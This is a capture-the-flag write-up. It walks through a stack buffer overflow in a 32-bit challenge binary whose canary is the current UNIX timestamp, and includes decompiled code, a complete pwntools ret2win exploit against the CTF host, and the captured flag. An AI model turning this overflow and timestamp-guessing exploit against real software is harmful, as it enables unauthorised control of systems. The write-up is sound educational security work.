The first thing I do to this file s to run the file and checksec commands to see what basic protection it has.  it is in 32 bit with  PIE disabled but it has NX. It also says it has no stack canary so the canary must be added at the runtime of the program.

I then run it in ghidra
```
  local_14 = popen("date +%s","r");
  if (local_14 == (FILE *)0x0) {
    puts("Failed to run command");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  fgets(local_20,12,local_14);
  pclose(local_14);
  global = strtol(local_20,(char **)0x0,10);
```
I can see from this snippet of code that it opens a file and get the UNIX timestamp, it then stores it and then turns it into a long and sets global equal to it. It then runs the readin() function with global as its parameter.

```
void read_in(int param_1)

{
  undefined1 local_58 [72];
  int local_10;
  
  local_10 = param_1;
  read(0,local_58,140);
  if (local_10 != global) {
    puts("****Stack Smashing Detected!!!****\nExiting now.");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  return;
}
```
Inside of readin() there is a read that allows for a buffer overflow! But then it checks the canary that is that global variable from before.

From there it is a normal ret2win with a canary but the I imported the time library so that I could also get the current timestamp for the canary value. When running remotely sometimes the time would have a slight discrepancy. I solved this by sending it in a loop and adjusting an offset from the original time.

```python
#!/usr/bin/env python3 
import subprocess
import time
from pwn import *

binary_path = './canary' # exe
libc_path = ''
remote_host = 'www.cweaccessionsctf.com'
remote_port = 1315  # <-- Needs to be a valid integer if using REMOTE

context.binary = binary_path
#context.terminal = ['tmux', 'splitw', '-h']
elf = context.binary
#libc = ELF(libc_path)
rop = ROP(elf)
#libc = ELF(libc_path)

if args.GDB:
    p = gdb.debug(binary_path, gdbscript='b *read_in+38')
elif args.REMOTE:
    p = remote(remote_host, remote_port)
else:
    p = process(binary_path)

def main():
    win = 0x080491f6

    canary = int(time.time()) + 2
    print(canary)

    payload = b''
    payload += b'A' * 72
    payload += p32(canary)
    payload += b'B' * 12
    payload += p32(win)

    p.sendline(payload)

    time.sleep(0.15)

    p.interactive()

if __name__ == '__main__':
    
    main()

```

CWE{fly_away_little_canary_TZ4gELYH}
<!--stackedit_data:
eyJoaXN0b3J5IjpbNTA0MTQ4NDA2XX0=
-->